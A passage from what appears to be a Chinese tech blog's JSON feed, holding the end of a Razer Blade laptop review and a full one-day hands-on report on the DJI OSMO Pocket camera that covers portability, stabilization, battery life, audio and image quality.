srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]